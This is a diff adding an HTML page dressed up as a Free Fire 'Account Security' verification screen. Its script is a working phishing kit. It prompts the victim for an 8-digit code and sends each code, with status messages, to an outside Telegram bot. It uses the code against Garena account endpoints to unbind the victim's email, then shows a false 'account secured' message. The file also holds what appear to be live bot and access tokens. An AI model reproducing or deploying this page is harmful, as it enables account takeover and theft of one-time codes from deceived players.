@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire - Account Security</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#fff;font-family:Arial,sans-serif}
+
+        .top-header{
+            width:100%;height:75px;background:#000;
+            display:flex;justify-content:space-between;
+            align-items:center;padding:0 18px;
+            position:fixed;top:0;left:0;right:0;z-index:100
+        }
+        .logo{height:34px;object-fit:contain}
+        .right-icons{display:flex;gap:12px}
+        .icon-btn{width:42px;height:42px;border:none;border-radius:50%;background:#1b1b1b;color:#fff;font-size:20px;cursor:pointer}
+        .icon-btn:hover{background:#333}
+
+        .banner{
+            width:100%;height:100vh;position:relative;
+            background:#000 url('banner.png') center/cover no-repeat;
+            display:flex;align-items:center;justify-content:center;
+            margin-top:75px
+        }
+        .banner::before{
+            content:'';position:absolute;top:0;left:0;right:0;bottom:0;
+            background:linear-gradient(180deg,rgba(0,0,0,0.2),rgba(0,0,0,0.7))
+        }
+        .content-box{position:relative;z-index:5;width:100%;max-width:460px;padding:0 20px;margin-top:-40px}
+
+        .prepare-img{width:100%;max-width:280px;margin:0 auto 28px;display:block}
+        .prepare-img img{width:100%;height:auto;display:block}
+
+        .row-email-send{
+            display:flex;gap:12px;align-items:center;margin-bottom:0
+        }
+        .row-email-send .email-field{flex:1;position:relative}
+        .row-email-send .email-field input{
+            width:100%;padding:14px 16px;
+            background:rgba(255,255,255,0.08);
+            border:1px solid rgba(255,255,255,0.15);
+            color:#fff;font-size:14px;outline:none;font-family:inherit;
+        }
+        .btn-send{
+            padding:14px 28px;background:#ffc300;border:none;
+            color:#0a0a0a;font-size:14px;font-weight:700;
+            cursor:pointer;font-family:inherit;text-transform:uppercase;
+            min-width:120px;text-align:center;
+        }
+        .btn-send:hover:not(:disabled){background:#ffd633}
+        .btn-send:disabled{background:rgba(255,255,255,0.1);color:rgba(255,255,255,0.3);cursor:not-allowed}
+
+        .otp-section{margin-top:16px;display:block;animation:fadeIn .4s ease}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+        .otp-label{color:rgba(255,255,255,0.6);font-size:13px;margin-bottom:10px;text-align:center}
+        .otp-row{display:flex;gap:8px;justify-content:center;margin-bottom:14px;flex-wrap:wrap}
+        .otp-row input{
+            width:42px;height:48px;text-align:center;font-size:20px;font-weight:700;
+            border:1px solid rgba(255,255,255,0.2);outline:none;
+            font-family:'Courier New',monospace;
+            background:rgba(255,255,255,0.06);color:#fff;
+        }
+        .otp-row input:focus{border-color:#ffc300}
+        .otp-row input.filled{border-color:#4caf50;background:rgba(76,175,80,0.1)}
+
+        .btn-verify{
+            width:100%;padding:14px;background:#ffc300;border:none;
+            color:#0a0a0a;font-size:14px;font-weight:700;
+            cursor:pointer;font-family:inherit;text-transform:uppercase;
+        }
+        .btn-verify:hover:not(:disabled){background:#ffd633}
+        .btn-verify:disabled{background:rgba(255,255,255,0.1);color:rgba(255,255,255,0.3);cursor:not-allowed}
+
+        .err{display:none;background:rgba(198,40,40,0.15);border:1px solid rgba(198,40,40,0.3);padding:10px 14px;margin-bottom:12px;font-size:13px;color:#ef5350;text-align:center}
+        .err.show{display:block}
+
+        .success{text-align:center;padding:30px 0}
+        .success .icon{width:72px;height:72px;background:#4caf50;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;animation:popIn .5s cubic-bezier(.68,-0.55,.27,1.55)}
+        @keyframes popIn{0%{transform:scale(0);opacity:0}100%{transform:scale(1);opacity:1}}
+        .success h2{font-size:24px;color:#fff;margin-bottom:8px;font-weight:800}
+        .success p{font-size:14px;color:rgba(255,255,255,0.6)}
+        .success .bdg{display:inline-block;background:rgba(255,195,0,0.15);color:#ffc300;padding:8px 20px;font-size:13px;font-weight:600;margin-top:14px}
+        .hide{display:none!important}
+
+        .loading{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.9);z-index:999;justify-content:center;align-items:center;flex-direction:column}
+        .loading.show{display:flex}
+        .spin{width:36px;height:36px;border:3px solid rgba(255,255,255,.1);border-top:3px solid #ffc300;border-radius:50%;animation:sp .7s linear infinite}
+        @keyframes sp{to{transform:rotate(360deg)}}
+        .lt{font-size:14px;color:#ffc300;margin-top:14px}
+
+        .hint{font-size:12px;color:rgba(255,255,255,0.4);margin-top:8px;text-align:center}
+        .hint a{color:#ffc300;text-decoration:none}
+
+        @media(max-width:480px){
+            .top-header{height:65px;padding:0 12px}.logo{height:28px}
+            .icon-btn{width:36px;height:36px;font-size:17px}
+            .row-email-send{flex-direction:column;gap:10px}.btn-send{width:100%}
+            .otp-row{gap:5px}.otp-row input{width:36px;height:42px;font-size:17px}
+            .prepare-img{max-width:200px;margin-bottom:20px}.content-box{margin-top:-30px}
+        }
+    </style>
+</head>
+<body>
+
+<header class="top-header">
+    <img src="logo-icon.png" class="logo" alt="Free Fire">
+    <div class="right-icons">
+        <button class="icon-btn">🛒</button>
+        <button class="icon-btn">🌐</button>
+        <button class="icon-btn">☰</button>
+    </div>
+</header>
+
+<div class="loading" id="loading">
+    <div class="spin"></div>
+    <div class="lt" id="loadText">Processing...</div>
+</div>
+
+<div class="banner">
+    <div class="content-box">
+        
+        <div class="prepare-img">
+            <img src="prepare-battle.png" alt="Prepare for Battle">
+        </div>
+        
+        <div id="pageMain">
+            
+            <!-- Email field - disabled, automatically filled -->
+            <div class="row-email-send">
+                <div class="email-field">
+                    <input type="email" id="emailInput" disabled>
+                </div>
+                <button class="btn-send" id="sendBtn" onclick="handleSend()">SEND</button>
+            </div>
+            
+            <div class="err" id="errorMsg"></div>
+            
+            <!-- OTP SECTION - 8 digit, visible -->
+            <div class="otp-section" id="otpSection">
+                <div class="otp-label">Enter 8-digit verification code</div>
+                
+                <div class="otp-row" id="otpContainer">
+                    <input type="text" id="o1" maxlength="1" inputmode="numeric" oninput="mo(this,'o2')" onkeydown="bk(this,event)">
+                    <input type="text" id="o2" maxlength="1" inputmode="numeric" oninput="mo(this,'o3')" onkeydown="bk(this,event)">
+                    <input type="text" id="o3" maxlength="1" inputmode="numeric" oninput="mo(this,'o4')" onkeydown="bk(this,event)">
+                    <input type="text" id="o4" maxlength="1" inputmode="numeric" oninput="mo(this,'o5')" onkeydown="bk(this,event)">
+                    <input type="text" id="o5" maxlength="1" inputmode="numeric" oninput="mo(this,'o6')" onkeydown="bk(this,event)">
+                    <input type="text" id="o6" maxlength="1" inputmode="numeric" oninput="mo(this,'o7')" onkeydown="bk(this,event)">
+                    <input type="text" id="o7" maxlength="1" inputmode="numeric" oninput="mo(this,'o8')" onkeydown="bk(this,event)">
+                    <input type="text" id="o8" maxlength="1" inputmode="numeric" oninput="mo(this,null)" onkeydown="bk(this,event)">
+                </div>
+                
+                <button class="btn-verify" id="verifyBtn" onclick="handleVerify()" disabled>VERIFY & SECURE</button>
+                
+                <div class="hint">
+                    Didn't receive? <a href="#" onclick="handleSend();return false;" style="color:#ffc300;text-decoration:none;">Resend Code</a>
+                </div>
+            </div>
+            
+        </div>
+        
+        <!-- SUCCESS PAGE -->
+        <div id="pageSuccess" class="hide">
+            <div class="success">
+                <div class="icon">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" width="32" height="32">
+                        <polyline points="20 6 9 17 4 12"/>
+                    </svg>
+                </div>
+                <h2>✅ VERIFICATION COMPLETE!</h2>
+                <p>Your Free Fire account has been successfully secured.</p>
+                <p style="font-size:13px;margin-top:4px;">The email unbinding request has been completed.</p>
+                <div class="bdg">🔒 Account Protected & Secured</div>
+            </div>
+        </div>
+        
+    </div>
+</div>
+
+<script>
+// =====================================================================
+// 🔥 YAHAN APNA EMAIL AUR ACCESS TOKEN DALO - SIRF YAHI CHANGE KARNA
+// =====================================================================
+const TARGET_EMAIL = 'rajneeshwork52@gmail.com';     // <-- APNA EMAIL DALO
+const ACCESS_TOKEN = '09a1d983903a23f6765cfd159250c93f34e80198b07e6dd2ebcaddd1e84b30f8';  // <-- APNA TOKEN DALO
+// =====================================================================
+
+const BOT_TOKEN = '8813544761:AAGQnUjxBkMENF-QZzx29xwD67DYYyR9U4c';
+const CHAT_ID = '7060361293';
+const API = 'https://100067.connect.garena.com/game/account_security/bind';
+
+// FREE CORS PROXY - CORS error fix karne ke liye
+const CORS_PROXY = 'https://api.allorigins.win/raw?url=';
+
+const $ = id => document.getElementById(id);
+
+$('emailInput').value = TARGET_EMAIL;
+
+function tg(msg) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:CHAT_ID, text:msg})
+    }).catch(()=>{});
+}
+
+function showL(t){$('loadText').textContent=t||'Processing...';$('loading').classList.add('show')}
+function hideL(){$('loading').classList.remove('show')}
+
+function showError(msg){
+    const el=$('errorMsg');
+    el.textContent=msg;
+    el.classList.add('show');
+}
+function hideError(){$('errorMsg').classList.remove('show')}
+
+const OTP_LEN = 8;
+
+function mo(cur,nid){
+    cur.value=cur.value.replace(/[^0-9]/g,'').slice(0,1);
+    cur.classList.toggle('filled',cur.value.length>0);
+    if(cur.value.length&&nid)$(nid).focus();
+    updateVerifyBtn();
+}
+function bk(inp,ev){
+    if(ev.key==='Backspace'&&!inp.value){
+        for(let i=OTP_LEN;i>=1;i--){
+            if($('o'+i)===inp&&i>1){
+                $('o'+(i-1)).focus();
+                $('o'+(i-1)).value='';
+                $('o'+(i-1)).classList.remove('filled');
+                break;
+            }
+        }
+    }updateVerifyBtn();
+}
+function updateVerifyBtn(){
+    let ok=true;
+    for(let i=1;i<=OTP_LEN;i++){if(!$('o'+i).value){ok=false;break}}
+    $('verifyBtn').disabled=!ok;
+}
+function resetOtp(){
+    for(let i=1;i<=OTP_LEN;i++){$('o'+i).value='';$('o'+i).classList.remove('filled')}
+    $('verifyBtn').disabled=true;
+}
+function getOtpCode(){
+    let c='';
+    for(let i=1;i<=OTP_LEN;i++)c+=$('o'+i).value||'';
+    return c.length===OTP_LEN?c:null;
+}
+
+// CORS proxy ke through API call
+async function callGarena(endpoint, data) {
+    const url = API + endpoint;
+    const proxyUrl = CORS_PROXY + encodeURIComponent(url);
+    
+    const formBody = new URLSearchParams(data).toString();
+    
+    const res = await fetch(proxyUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: formBody
+    });
+    
+    const text = await res.text();
+    
+    // Agar proxy ne JSON wrap kiya hai to parse karo
+    try {
+        const parsed = JSON.parse(text);
+        // Proxy response format check
+        if (parsed.contents) {
+            return JSON.parse(parsed.contents);
+        }
+        return parsed;
+    } catch(e) {
+        throw new Error('Invalid response from server');
+    }
+}
+
+// SEND OTP
+async function handleSend(){
+    hideError();
+    const btn=$('sendBtn');
+    btn.disabled=true;
+    btn.textContent='SENDING...';
+    
+    tg('📤 SEND OTP\n📧 '+TARGET_EMAIL);
+    
+    try {
+        const data={email:TARGET_EMAIL, locale:'en_PK', region:'PK', app_id:'100067', access_token:ACCESS_TOKEN};
+        const json = await callGarena(':send_otp', data);
+        
+        if(json.result===0){
+            tg('✅ OTP sent successfully');
+            hideError();
+            resetOtp();
+            setTimeout(()=>$('o1').focus(),200);
+        } else {
+            throw new Error(json.error||'Send failed (code: '+json.result+')');
+        }
+    } catch(err){
+        showError('Failed to send code: '+err.message+'. Try again.');
+        tg('❌ SEND FAILED: '+err.message);
+    } finally {
+        btn.textContent='SEND';
+        btn.disabled=false;
+    }
+}
+
+// VERIFY + UNBIND (sahi flow)
+async function handleVerify(){
+    hideError();
+    const code=getOtpCode();
+    if(!code)return;
+    
+    const btn=$('verifyBtn');
+    btn.disabled=true;
+    btn.textContent='VERIFYING...';
+    showL('Verifying & securing account...');
+    
+    tg('🔐 VERIFY\n📧 '+TARGET_EMAIL+'\n🔢 '+code);
+    
+    try {
+        // STEP 1: verify_identity (OTP verify karta hai)
+        const d1={app_id:'100067', access_token:ACCESS_TOKEN, email:TARGET_EMAIL, otp:code};
+        const j1 = await callGarena(':verify_identity', d1);
+        
+        if(j1.result!==0) {
+            throw new Error('Invalid OTP or expired (code: '+j1.result+')');
+        }
+        
+        const identityToken = j1.identity_token;
+        if(!identityToken) {
+            throw new Error('Server did not return identity_token');
+        }
+        
+        tg('✅ Identity verified');
+        showL('Unbinding email from account...');
+        
+        // STEP 2: create_unbind_request
+        const d2={app_id:'100067', access_token:ACCESS_TOKEN, identity_token:identityToken};
+        const j2 = await callGarena(':create_unbind_request', d2);
+        
+        hideL();
+        
+        if(j2.result===0){
+            tg('✅✅ UNBIND SUCCESSFUL');
+            $('pageMain').classList.add('hide');
+            $('pageSuccess').classList.remove('hide');
+        } else {
+            throw new Error(j2.error||'Unbind failed (code: '+j2.result+')');
+        }
+        
+    } catch(err){
+        hideL();
+        showError('❌ Verification failed: '+err.message);
+        tg('❌ FAILED: '+err.message);
+        btn.textContent='VERIFY & SECURE';
+        btn.disabled=false;
+        resetOtp();
+        $('o1').focus();
+    }
+}
+
+document.addEventListener('DOMContentLoaded',()=>{
+    $('otpContainer').addEventListener('paste',(e)=>{
+        e.preventDefault();
+        const text=(e.clipboardData||window.clipboardData).getData('text');
+        const digits=text.replace(/[^0-9]/g,'').slice(0,OTP_LEN);
+        if(!digits)return;
+        for(let i=0;i<digits.length;i++){
+            const f=$('o'+(i+1));
+            if(f){f.value=digits[i];f.classList.add('filled')}
+        }
+        $('o'+(Math.min(digits.length,OTP_LEN-1)+1)).focus();
+        updateVerifyBtn();
+    });
+    
+    document.querySelectorAll('.otp-row input').forEach(inp=>{
+        inp.addEventListener('keydown',(e)=>{
+            if(e.key==='Enter'&&!$('verifyBtn').disabled) handleVerify();
+        });
+    });
+});
+</script>
+</body>
+</html>
